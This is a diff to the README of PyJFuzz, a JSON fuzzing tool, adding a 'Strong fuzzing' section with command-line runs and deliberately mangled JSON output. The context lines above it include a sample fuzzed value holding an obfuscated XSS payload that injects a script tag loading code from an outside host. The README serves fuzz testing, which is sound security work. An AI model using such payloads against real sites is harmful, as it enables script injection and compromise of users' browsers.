@@ -131,6 +131,25 @@ PyJFuzz v0.2 - Daniele 'dzonerzy' Linguaglossa - danielelinguaglossa@gmail.com
      "test": "</script><svg/onload='+/\"/+/onmouseover=1/+(s=document.createElement(/script/.source),s.stack=Error().stack,s.src=(/,/+(s=document.createElement(/script/.source),s.stack=Error().stack,s.src=(/,/+(s=document.createElement(/script/.source),s.stack,s.src=(/,/+/a.net/).slice(2),document.documentElement.appendChild(s))//'>\u000a;</script><svg/onload='+/\"/+/onmouseover=1/+(s=document.createElement(/script/.source),s.stack=Error().stack,s.src=(/,/+(s=document.createElement(/script/.source),s.stack=Error().stack,s.src=(/,/+/a.net/).slice(2),document.documentElement.appendChild(s))//'>\u000a;"
 }
 ```
+## Strong fuzzing
+Strong fuzzing provides the ability to do extreme fuzzing over the JSON object, the structure is not guaranteed!
+```
+dzonerzy:jsonfuzz dzonerzy$ python pyjfuzz.py -j '{"a": 1}' -s
+PyJFuzz v0.1 - Daniele 'dzonerzy' Linguaglossa - d.linguaglossa@mseclab.it
+[INFO] Using (Radamsa 0.5)
+
+{"a"�: -170141183460469231731687303715884105731k340282366920938463463374607431768389478}
+dzonerzy:jsonfuzz dzonerzy$ python pyjfuzz.py -j '{"a": 1}' -s
+PyJFuzz v0.1 - Daniele 'dzonerzy' Linguaglossa - d.linguaglossa@mseclab.it
+[INFO] Using (Radamsa 0.5)
+
+{"a": 1": 1 1}�
+               �dzonerzy:jsonfuzz dzonerzy$ python pyjfuzz.py -j '{"a": 1}' -s
+PyJFuzz v0.1 - Daniele 'dzonerzy' Linguaglossa - d.linguaglossa@mseclab.it
+[INFO] Using (Radamsa 0.5)
+
+{"a"‮:󠁝� �� 0}
+```
 ## Using as a module
 PyJFuzz can be install as a standalone module this will provide you the ability to create your custom program based on PyJFuzz!
 Below an example:
